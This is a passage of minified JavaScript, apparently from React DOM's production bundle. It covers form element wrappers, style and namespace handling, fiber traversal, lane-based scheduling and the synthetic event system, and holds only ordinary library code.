    t.hasOwnProperty("value") ? ao(e, t.type, n) : t.hasOwnProperty("defaultValue") && ao(e, t.type, Wt(t.defaultValue)), t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked)
}

function cs(e, t, n) {
    if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
        var r = t.type;
        if (!(r !== "submit" && r !== "reset" || t.value !== void 0 && t.value !== null)) return;
        t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t
    }
    n = e.name, n !== "" && (e.name = ""), e.defaultChecked = !!e._wrapperState.initialChecked, n !== "" && (e.name = n)
}

function ao(e, t, n) {
    (t !== "number" || Pl(e.ownerDocument) !== e) && (n == null ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
}
var ir = Array.isArray;

function _n(e, t, n, r) {
    if (e = e.options, t) {
        t = {};
        for (var l = 0; l < n.length; l++) t["$" + n[l]] = !0;
        for (n = 0; n < e.length; n++) l = t.hasOwnProperty("$" + e[n].value), e[n].selected !== l && (e[n].selected = l), l && r && (e[n].defaultSelected = !0)
    } else {
        for (n = "" + Wt(n), t = null, l = 0; l < e.length; l++) {
            if (e[l].value === n) {
                e[l].selected = !0, r && (e[l].defaultSelected = !0);
                return
            }
            t !== null || e[l].disabled || (t = e[l])
        }
        t !== null && (t.selected = !0)
    }
}

function oo(e, t) {
    if (t.dangerouslySetInnerHTML != null) throw Error(b(91));
    return Y({}, t, {
        value: void 0,
        defaultValue: void 0,
        children: "" + e._wrapperState.initialValue
    })
}

function ds(e, t) {
    var n = t.value;
    if (n == null) {
        if (n = t.children, t = t.defaultValue, n != null) {
            if (t != null) throw Error(b(92));
            if (ir(n)) {
                if (1 < n.length) throw Error(b(93));
                n = n[0]
            }
            t = n
        }
        t == null && (t = ""), n = t
    }
    e._wrapperState = {
        initialValue: Wt(n)
    }
}

function Du(e, t) {
    var n = Wt(t.value),
        r = Wt(t.defaultValue);
    n != null && (n = "" + n, n !== e.value && (e.value = n), t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)), r != null && (e.defaultValue = "" + r)
}

function fs(e) {
    var t = e.textContent;
    t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t)
}

function Iu(e) {
    switch (e) {
        case "svg":
            return "http://www.w3.org/2000/svg";
        case "math":
            return "http://www.w3.org/1998/Math/MathML";
        default:
            return "http://www.w3.org/1999/xhtml"
    }
}

function io(e, t) {
    return e == null || e === "http://www.w3.org/1999/xhtml" ? Iu(t) : e === "http://www.w3.org/2000/svg" && t === "foreignObject" ? "http://www.w3.org/1999/xhtml" : e
}
var qr, Au = function(e) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function(t, n, r, l) {
        MSApp.execUnsafeLocalFunction(function() {
            return e(t, n, r, l)
        })
    } : e
}(function(e, t) {
    if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in e) e.innerHTML = t;
    else {
        for (qr = qr || document.createElement("div"), qr.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = qr.firstChild; e.firstChild;) e.removeChild(e.firstChild);
        for (; t.firstChild;) e.appendChild(t.firstChild)
    }
});

function br(e, t) {
    if (t) {
        var n = e.firstChild;
        if (n && n === e.lastChild && n.nodeType === 3) {
            n.nodeValue = t;
            return
        }
    }
    e.textContent = t
}
var dr = {
        animationIterationCount: !0,
        aspectRatio: !0,
        borderImageOutset: !0,
        borderImageSlice: !0,
        borderImageWidth: !0,
        boxFlex: !0,
        boxFlexGroup: !0,
        boxOrdinalGroup: !0,
        columnCount: !0,
        columns: !0,
        flex: !0,
        flexGrow: !0,
        flexPositive: !0,
        flexShrink: !0,
        flexNegative: !0,
        flexOrder: !0,
        gridArea: !0,
        gridRow: !0,
        gridRowEnd: !0,
        gridRowSpan: !0,
        gridRowStart: !0,
        gridColumn: !0,
        gridColumnEnd: !0,
        gridColumnSpan: !0,
        gridColumnStart: !0,
        fontWeight: !0,
        lineClamp: !0,
        lineHeight: !0,
        opacity: !0,
        order: !0,
        orphans: !0,
        tabSize: !0,
        widows: !0,
        zIndex: !0,
        zoom: !0,
        fillOpacity: !0,
        floodOpacity: !0,
        stopOpacity: !0,
        strokeDasharray: !0,
        strokeDashoffset: !0,
        strokeMiterlimit: !0,
        strokeOpacity: !0,
        strokeWidth: !0
    },
    Lf = ["Webkit", "ms", "Moz", "O"];
Object.keys(dr).forEach(function(e) {
    Lf.forEach(function(t) {
        t = t + e.charAt(0).toUpperCase() + e.substring(1), dr[t] = dr[e]
    })
});

function Wu(e, t, n) {
    return t == null || typeof t == "boolean" || t === "" ? "" : n || typeof t != "number" || t === 0 || dr.hasOwnProperty(e) && dr[e] ? ("" + t).trim() : t + "px"
}

function Uu(e, t) {
    e = e.style;
    for (var n in t)
        if (t.hasOwnProperty(n)) {
            var r = n.indexOf("--") === 0,
                l = Wu(n, t[n], r);
            n === "float" && (n = "cssFloat"), r ? e.setProperty(n, l) : e[n] = l
        }
}
var $f = Y({
    menuitem: !0
}, {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0
});

function so(e, t) {
    if (t) {
        if ($f[e] && (t.children != null || t.dangerouslySetInnerHTML != null)) throw Error(b(137, e));
        if (t.dangerouslySetInnerHTML != null) {
            if (t.children != null) throw Error(b(60));
            if (typeof t.dangerouslySetInnerHTML != "object" || !("__html" in t.dangerouslySetInnerHTML)) throw Error(b(61))
        }
        if (t.style != null && typeof t.style != "object") throw Error(b(62))
    }
}

function uo(e, t) {
    if (e.indexOf("-") === -1) return typeof t.is == "string";
    switch (e) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0
    }
}
var co = null;

function ii(e) {
    return e = e.target || e.srcElement || window, e.correspondingUseElement && (e = e.correspondingUseElement), e.nodeType === 3 ? e.parentNode : e
}
var fo = null,
    Ln = null,
    $n = null;

function ps(e) {
    if (e = Hr(e)) {
        if (typeof fo != "function") throw Error(b(280));
        var t = e.stateNode;
        t && (t = aa(t), fo(e.stateNode, e.type, t))
    }
}

function Hu(e) {
    Ln ? $n ? $n.push(e) : $n = [e] : Ln = e
}

function Bu() {
    if (Ln) {
        var e = Ln,
            t = $n;
        if ($n = Ln = null, ps(e), t)
            for (e = 0; e < t.length; e++) ps(t[e])
    }
}

function Vu(e, t) {
    return e(t)
}

function Qu() {}
var Sa = !1;

function Ku(e, t, n) {
    if (Sa) return e(t, n);
    Sa = !0;
    try {
        return Vu(e, t, n)
    } finally {
        Sa = !1, (Ln !== null || $n !== null) && (Qu(), Bu())
    }
}

function Sr(e, t) {
    var n = e.stateNode;
    if (n === null) return null;
    var r = aa(n);
    if (r === null) return null;
    n = r[t];
    e: switch (t) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (r = !r.disabled) || (e = e.type, r = !(e === "button" || e === "input" || e === "select" || e === "textarea")), e = !r;
            break e;
        default:
            e = !1
    }
    if (e) return null;
    if (n && typeof n != "function") throw Error(b(231, t, typeof n));
    return n
}
var po = !1;
if (yt) try {
    var Zn = {};
    Object.defineProperty(Zn, "passive", {
        get: function() {
            po = !0
        }
    }), window.addEventListener("test", Zn, Zn), window.removeEventListener("test", Zn, Zn)
} catch {
    po = !1
}

function Ff(e, t, n, r, l, a, o, i, s) {
    var u = Array.prototype.slice.call(arguments, 3);
    try {
        t.apply(n, u)
    } catch (d) {
        this.onError(d)
    }
}
var fr = !1,
    jl = null,
    _l = !1,
    mo = null,
    Of = {
        onError: function(e) {
            fr = !0, jl = e
        }
    };

function Rf(e, t, n, r, l, a, o, i, s) {
    fr = !1, jl = null, Ff.apply(Of, arguments)
}

function Mf(e, t, n, r, l, a, o, i, s) {
    if (Rf.apply(this, arguments), fr) {
        if (fr) {
            var u = jl;
            fr = !1, jl = null
        } else throw Error(b(198));
        _l || (_l = !0, mo = u)
    }
}

function fn(e) {
    var t = e,
        n = e;
    if (e.alternate)
        for (; t.return;) t = t.return;
    else {
        e = t;
        do t = e, t.flags & 4098 && (n = t.return), e = t.return; while (e)
    }
    return t.tag === 3 ? n : null
}

function Yu(e) {
    if (e.tag === 13) {
        var t = e.memoizedState;
        if (t === null && (e = e.alternate, e !== null && (t = e.memoizedState)), t !== null) return t.dehydrated
    }
    return null
}

function ms(e) {
    if (fn(e) !== e) throw Error(b(188))
}

function zf(e) {
    var t = e.alternate;
    if (!t) {
        if (t = fn(e), t === null) throw Error(b(188));
        return t !== e ? null : e
    }
    for (var n = e, r = t;;) {
        var l = n.return;
        if (l === null) break;
        var a = l.alternate;
        if (a === null) {
            if (r = l.return, r !== null) {
                n = r;
                continue
            }
            break
        }
        if (l.child === a.child) {
            for (a = l.child; a;) {
                if (a === n) return ms(l), e;
                if (a === r) return ms(l), t;
                a = a.sibling
            }
            throw Error(b(188))
        }
        if (n.return !== r.return) n = l, r = a;
        else {
            for (var o = !1, i = l.child; i;) {
                if (i === n) {
                    o = !0, n = l, r = a;
                    break
                }
                if (i === r) {
                    o = !0, r = l, n = a;
                    break
                }
                i = i.sibling
            }
            if (!o) {
                for (i = a.child; i;) {
                    if (i === n) {
                        o = !0, n = a, r = l;
                        break
                    }
                    if (i === r) {
                        o = !0, r = a, n = l;
                        break
                    }
                    i = i.sibling
                }
                if (!o) throw Error(b(189))
            }
        }
        if (n.alternate !== r) throw Error(b(190))
    }
    if (n.tag !== 3) throw Error(b(188));
    return n.stateNode.current === n ? e : t
}

function Gu(e) {
    return e = zf(e), e !== null ? Xu(e) : null
}

function Xu(e) {
    if (e.tag === 5 || e.tag === 6) return e;
    for (e = e.child; e !== null;) {
        var t = Xu(e);
        if (t !== null) return t;
        e = e.sibling
    }
    return null
}
var Zu = Oe.unstable_scheduleCallback,
    hs = Oe.unstable_cancelCallback,
    Df = Oe.unstable_shouldYield,
    If = Oe.unstable_requestPaint,
    X = Oe.unstable_now,
    Af = Oe.unstable_getCurrentPriorityLevel,
    si = Oe.unstable_ImmediatePriority,
    Ju = Oe.unstable_UserBlockingPriority,
    Ll = Oe.unstable_NormalPriority,
    Wf = Oe.unstable_LowPriority,
    qu = Oe.unstable_IdlePriority,
    ta = null,
    it = null;

function Uf(e) {
    if (it && typeof it.onCommitFiberRoot == "function") try {
        it.onCommitFiberRoot(ta, e, void 0, (e.current.flags & 128) === 128)
    } catch {}
}
var et = Math.clz32 ? Math.clz32 : Vf,
    Hf = Math.log,
    Bf = Math.LN2;

function Vf(e) {
    return e >>>= 0, e === 0 ? 32 : 31 - (Hf(e) / Bf | 0) | 0
}
var el = 64,
    tl = 4194304;

function sr(e) {
    switch (e & -e) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return e & 4194240;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return e & 130023424;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 1073741824;
        default:
            return e
    }
}

function $l(e, t) {
    var n = e.pendingLanes;
    if (n === 0) return 0;
    var r = 0,
        l = e.suspendedLanes,
        a = e.pingedLanes,
        o = n & 268435455;
    if (o !== 0) {
        var i = o & ~l;
        i !== 0 ? r = sr(i) : (a &= o, a !== 0 && (r = sr(a)))
    } else o = n & ~l, o !== 0 ? r = sr(o) : a !== 0 && (r = sr(a));
    if (r === 0) return 0;
    if (t !== 0 && t !== r && !(t & l) && (l = r & -r, a = t & -t, l >= a || l === 16 && (a & 4194240) !== 0)) return t;
    if (r & 4 && (r |= n & 16), t = e.entangledLanes, t !== 0)
        for (e = e.entanglements, t &= r; 0 < t;) n = 31 - et(t), l = 1 << n, r |= e[n], t &= ~l;
    return r
}

function Qf(e, t) {
    switch (e) {
        case 1:
        case 2:
        case 4:
            return t + 250;
        case 8:
        case 16:
        case 32:
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return t + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return -1;
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
            return -1;
        default:
            return -1
    }
}

function Kf(e, t) {
    for (var n = e.suspendedLanes, r = e.pingedLanes, l = e.expirationTimes, a = e.pendingLanes; 0 < a;) {
        var o = 31 - et(a),
            i = 1 << o,
            s = l[o];
        s === -1 ? (!(i & n) || i & r) && (l[o] = Qf(i, t)) : s <= t && (e.expiredLanes |= i), a &= ~i
    }
}

function ho(e) {
    return e = e.pendingLanes & -1073741825, e !== 0 ? e : e & 1073741824 ? 1073741824 : 0
}

function ec() {
    var e = el;
    return el <<= 1, !(el & 4194240) && (el = 64), e
}

function Ea(e) {
    for (var t = [], n = 0; 31 > n; n++) t.push(e);
    return t
}

function Wr(e, t, n) {
    e.pendingLanes |= t, t !== 536870912 && (e.suspendedLanes = 0, e.pingedLanes = 0), e = e.eventTimes, t = 31 - et(t), e[t] = n
}

function Yf(e, t) {
    var n = e.pendingLanes & ~t;
    e.pendingLanes = t, e.suspendedLanes = 0, e.pingedLanes = 0, e.expiredLanes &= t, e.mutableReadLanes &= t, e.entangledLanes &= t, t = e.entanglements;
    var r = e.eventTimes;
    for (e = e.expirationTimes; 0 < n;) {
        var l = 31 - et(n),
            a = 1 << l;
        t[l] = 0, r[l] = -1, e[l] = -1, n &= ~a
    }
}

function ui(e, t) {
    var n = e.entangledLanes |= t;
    for (e = e.entanglements; n;) {
        var r = 31 - et(n),
            l = 1 << r;
        l & t | e[r] & t && (e[r] |= t), n &= ~l
    }
}
var D = 0;

function tc(e) {
    return e &= -e, 1 < e ? 4 < e ? e & 268435455 ? 16 : 536870912 : 4 : 1
}
var nc, ci, rc, lc, ac, vo = !1,
    nl = [],
    Ft = null,
    Ot = null,
    Rt = null,
    Er = new Map,
    Nr = new Map,
    Tt = [],
    Gf = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");

function vs(e, t) {
    switch (e) {
        case "focusin":
        case "focusout":
            Ft = null;
            break;
        case "dragenter":
        case "dragleave":
            Ot = null;
            break;
        case "mouseover":
        case "mouseout":
            Rt = null;
            break;
        case "pointerover":
        case "pointerout":
            Er.delete(t.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            Nr.delete(t.pointerId)
    }
}

function Jn(e, t, n, r, l, a) {
    return e === null || e.nativeEvent !== a ? (e = {
        blockedOn: t,
        domEventName: n,
        eventSystemFlags: r,
        nativeEvent: a,
        targetContainers: [l]
    }, t !== null && (t = Hr(t), t !== null && ci(t)), e) : (e.eventSystemFlags |= r, t = e.targetContainers, l !== null && t.indexOf(l) === -1 && t.push(l), e)
}

function Xf(e, t, n, r, l) {
    switch (t) {
        case "focusin":
            return Ft = Jn(Ft, e, t, n, r, l), !0;
        case "dragenter":
            return Ot = Jn(Ot, e, t, n, r, l), !0;
        case "mouseover":
            return Rt = Jn(Rt, e, t, n, r, l), !0;
        case "pointerover":
            var a = l.pointerId;
            return Er.set(a, Jn(Er.get(a) || null, e, t, n, r, l)), !0;
        case "gotpointercapture":
            return a = l.pointerId, Nr.set(a, Jn(Nr.get(a) || null, e, t, n, r, l)), !0
    }
    return !1
}

function oc(e) {
    var t = Jt(e.target);
    if (t !== null) {
        var n = fn(t);
        if (n !== null) {
            if (t = n.tag, t === 13) {
                if (t = Yu(n), t !== null) {
                    e.blockedOn = t, ac(e.priority, function() {
                        rc(n)
                    });
                    return
                }
            } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
                e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
                return
            }
        }
    }
    e.blockedOn = null
}

function gl(e) {
    if (e.blockedOn !== null) return !1;
    for (var t = e.targetContainers; 0 < t.length;) {
        var n = go(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
        if (n === null) {
            n = e.nativeEvent;
            var r = new n.constructor(n.type, n);
            co = r, n.target.dispatchEvent(r), co = null
        } else return t = Hr(n), t !== null && ci(t), e.blockedOn = n, !1;
        t.shift()
    }
    return !0
}

function gs(e, t, n) {
    gl(e) && n.delete(t)
}

function Zf() {
    vo = !1, Ft !== null && gl(Ft) && (Ft = null), Ot !== null && gl(Ot) && (Ot = null), Rt !== null && gl(Rt) && (Rt = null), Er.forEach(gs), Nr.forEach(gs)
}

function qn(e, t) {
    e.blockedOn === t && (e.blockedOn = null, vo || (vo = !0, Oe.unstable_scheduleCallback(Oe.unstable_NormalPriority, Zf)))
}

function Cr(e) {
    function t(l) {
        return qn(l, e)
    }
    if (0 < nl.length) {
        qn(nl[0], e);
        for (var n = 1; n < nl.length; n++) {
            var r = nl[n];
            r.blockedOn === e && (r.blockedOn = null)
        }
    }
    for (Ft !== null && qn(Ft, e), Ot !== null && qn(Ot, e), Rt !== null && qn(Rt, e), Er.forEach(t), Nr.forEach(t), n = 0; n < Tt.length; n++) r = Tt[n], r.blockedOn === e && (r.blockedOn = null);
    for (; 0 < Tt.length && (n = Tt[0], n.blockedOn === null);) oc(n), n.blockedOn === null && Tt.shift()
}
var Fn = bt.ReactCurrentBatchConfig,
    Fl = !0;

function Jf(e, t, n, r) {
    var l = D,
        a = Fn.transition;
    Fn.transition = null;
    try {
        D = 1, di(e, t, n, r)
    } finally {
        D = l, Fn.transition = a
    }
}

function qf(e, t, n, r) {
    var l = D,
        a = Fn.transition;
    Fn.transition = null;
    try {
        D = 4, di(e, t, n, r)
    } finally {
        D = l, Fn.transition = a
    }
}

function di(e, t, n, r) {
    if (Fl) {
        var l = go(e, t, n, r);
        if (l === null) Oa(e, t, r, Ol, n), vs(e, r);
        else if (Xf(l, e, t, n, r)) r.stopPropagation();
        else if (vs(e, r), t & 4 && -1 < Gf.indexOf(e)) {
            for (; l !== null;) {
                var a = Hr(l);
                if (a !== null && nc(a), a = go(e, t, n, r), a === null && Oa(e, t, r, Ol, n), a === l) break;
                l = a
            }
            l !== null && r.stopPropagation()
        } else Oa(e, t, r, null, n)
    }
}
var Ol = null;

function go(e, t, n, r) {
    if (Ol = null, e = ii(r), e = Jt(e), e !== null)
        if (t = fn(e), t === null) e = null;
        else if (n = t.tag, n === 13) {
        if (e = Yu(t), e !== null) return e;
        e = null
    } else if (n === 3) {
        if (t.stateNode.current.memoizedState.isDehydrated) return t.tag === 3 ? t.stateNode.containerInfo : null;
        e = null
    } else t !== e && (e = null);
    return Ol = e, null
}

function ic(e) {
    switch (e) {
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 1;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "toggle":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 4;
        case "message":
            switch (Af()) {
                case si:
                    return 1;
                case Ju:
                    return 4;
                case Ll:
                case Wf:
                    return 16;
                case qu:
                    return 536870912;
                default:
                    return 16
            }
        default:
            return 16
    }
}
var _t = null,
    fi = null,
    yl = null;

function sc() {
    if (yl) return yl;
    var e, t = fi,
        n = t.length,
        r, l = "value" in _t ? _t.value : _t.textContent,
        a = l.length;
    for (e = 0; e < n && t[e] === l[e]; e++);
    var o = n - e;
    for (r = 1; r <= o && t[n - r] === l[a - r]; r++);
    return yl = l.slice(e, 1 < r ? 1 - r : void 0)
}

function wl(e) {
    var t = e.keyCode;
    return "charCode" in e ? (e = e.charCode, e === 0 && t === 13 && (e = 13)) : e = t, e === 10 && (e = 13), 32 <= e || e === 13 ? e : 0
}

function rl() {
    return !0
}

function ys() {
    return !1
}

function Me(e) {
    function t(n, r, l, a, o) {
        this._reactName = n, this._targetInst = l, this.type = r, this.nativeEvent = a, this.target = o, this.currentTarget = null;
        for (var i in e) e.hasOwnProperty(i) && (n = e[i], this[i] = n ? n(a) : a[i]);
        return this.isDefaultPrevented = (a.defaultPrevented != null ? a.defaultPrevented : a.returnValue === !1) ? rl : ys, this.isPropagationStopped = ys, this
    }
    return Y(t.prototype, {
        preventDefault: function() {
            this.defaultPrevented = !0;
            var n = this.nativeEvent;
            n && (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1), this.isDefaultPrevented = rl)
        },
        stopPropagation: function() {
            var n = this.nativeEvent;
            n && (n.stopPropagation ? n.stopPropagation() : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0), this.isPropagationStopped = rl)
        },
        persist: function() {},
        isPersistent: rl
    }), t
}
var Qn = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function(e) {
            return e.timeStamp || Date.now()
        },
        defaultPrevented: 0,
        isTrusted: 0
    },
    pi = Me(Qn),
    Ur = Y({}, Qn, {
        view: 0,
        detail: 0
    }),
    ep = Me(Ur),
    Na, Ca, er, na = Y({}, Ur, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: mi,
        button: 0,
        buttons: 0,
        relatedTarget: function(e) {
            return e.relatedTarget === void 0 ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
        },
        movementX: function(e) {
            return "movementX" in e ? e.movementX : (e !== er && (er && e.type === "mousemove" ? (Na = e.screenX - er.screenX, Ca = e.screenY - er.screenY) : Ca = Na = 0, er = e), Na)
        },
        movementY: function(e) {
            return "movementY" in e ? e.movementY : Ca
        }
    }),
    ws = Me(na),
    tp = Y({}, na, {
        dataTransfer: 0
    }),
    np = Me(tp),
    rp = Y({}, Ur, {
        relatedTarget: 0
    }),
    Ta = Me(rp),
    lp = Y({}, Qn, {
        animationName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }),
    ap = Me(lp),
    op = Y({}, Qn, {
        clipboardData: function(e) {
            return "clipboardData" in e ? e.clipboardData : window.clipboardData
        }
    }),
    ip = Me(op),
    sp = Y({}, Qn, {
        data: 0
    }),
    xs = Me(sp),
    up = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified"
    },
    cp = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta"
    },
    dp = {
        Alt: "altKey",
        Control: "ctrlKey",
        Meta: "metaKey",
        Shift: "shiftKey"
    };

function fp(e) {
    var t = this.nativeEvent;
    return t.getModifierState ? t.getModifierState(e) : (e = dp[e]) ? !!t[e] : !1
}

function mi() {
    return fp
}
var pp = Y({}, Ur, {
        key: function(e) {
            if (e.key) {
                var t = up[e.key] || e.key;
                if (t !== "Unidentified") return t
            }
            return e.type === "keypress" ? (e = wl(e), e === 13 ? "Enter" : String.fromCharCode(e)) : e.type === "keydown" || e.type === "keyup" ? cp[e.keyCode] || "Unidentified" : ""
        },
        code: 0,
        location: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        repeat: 0,
        locale: 0,
        getModifierState: mi,
        charCode: function(e) {
            return e.type === "keypress" ? wl(e) : 0
        },
        keyCode: function(e) {
            return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
        },
        which: function(e) {
            return e.type === "keypress" ? wl(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
        }
    }),
    mp = Me(pp),
    hp = Y({}, na, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0
    }),
    ks = Me(hp),
    vp = Y({}, Ur, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: mi
    }),
    gp = Me(vp),
    yp = Y({}, Qn, {
        propertyName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }),
    wp = Me(yp),
    xp = Y({}, na, {
        deltaX: function(e) {
            return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0
        },
        deltaY: function(e) {
            return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0
        },
        deltaZ: 0,
        deltaMode: 0
    }),
    kp = Me(xp),
    bp = [9, 13, 27, 32],
    hi = yt && "CompositionEvent" in window,
    pr = null;
yt && "documentMode" in document && (pr = document.documentMode);
var Sp = yt && "TextEvent" in window && !pr,
    uc = yt && (!hi || pr && 8 < pr && 11 >= pr),
    bs = " ",
    Ss = !1;

function cc(e, t) {
    switch (e) {
        case "keyup":
            return bp.indexOf(t.keyCode) !== -1;
        case "keydown":
            return t.keyCode !== 229;
        case "keypress":
        case "mousedown":
        case "focusout":
            return !0;
        default:
            return !1
    }
}

function dc(e) {
    return e = e.detail, typeof e == "object" && "data" in e ? e.data : null
}
var yn = !1;

function Ep(e, t) {
    switch (e) {
        case "compositionend":
            return dc(t);
        case "keypress":
            return t.which !== 32 ? null : (Ss = !0, bs);
        case "textInput":
            return e = t.data, e === bs && Ss ? null : e;
        default:
            return null
    }
}

function Np(e, t) {
    if (yn) return e === "compositionend" || !hi && cc(e, t) ? (e = sc(), yl = fi = _t = null, yn = !1, e) : null;
    switch (e) {
        case "paste":
            return null;
        case "keypress":
            if (!(t.ctrlKey || t.altKey || t.metaKey) || t.ctrlKey && t.altKey) {
                if (t.char && 1 < t.char.length) return t.char;
                if (t.which) return String.fromCharCode(t.which)
            }
            return null;
        case "compositionend":
            return uc && t.locale !== "ko" ? null : t.data;
        default:
            return null
    }
}
var Cp = {
    color: !0,
    date: !0,
    datetime: !0,
    "datetime-local": !0,
    email: !0,
    month: !0,
    number: !0,
    password: !0,
    range: !0,
    search: !0,
    tel: !0,
    text: !0,
    time: !0,
    url: !0,
    week: !0
};

function Es(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t === "input" ? !!Cp[e.type] : t === "textarea"
}

function fc(e, t, n, r) {
    Hu(r), t = Rl(t, "onChange"), 0 < t.length && (n = new pi("onChange", "change", null, n, r), e.push({
        event: n,
        listeners: t
    }))
}
var mr = null,
    Tr = null;

function Tp(e) {
    Sc(e, 0)
}

function ra(e) {
    var t = kn(e);
    if (Mu(t)) return e
}

function Pp(e, t) {
    if (e === "change") return t
}
var pc = !1;
if (yt) {
    var Pa;
    if (yt) {
        var ja = "oninput" in document;
        if (!ja) {
            var Ns = document.createElement("div");
            Ns.setAttribute("oninput", "return;"), ja = typeof Ns.oninput == "function"
        }
        Pa = ja
    } else Pa = !1;
    pc = Pa && (!document.documentMode || 9 < document.documentMode)
}

function Cs() {
    mr && (mr.detachEvent("onpropertychange", mc), Tr = mr = null)
}

function mc(e) {
    if (e.propertyName === "value" && ra(Tr)) {
        var t = [];
        fc(t, Tr, e, ii(e)), Ku(Tp, t)
    }
}

function jp(e, t, n) {
    e === "focusin" ? (Cs(), mr = t, Tr = n, mr.attachEvent("onpropertychange", mc)) : e === "focusout" && Cs()
}

function _p(e) {
    if (e === "selectionchange" || e === "keyup" || e === "keydown") return ra(Tr)
}

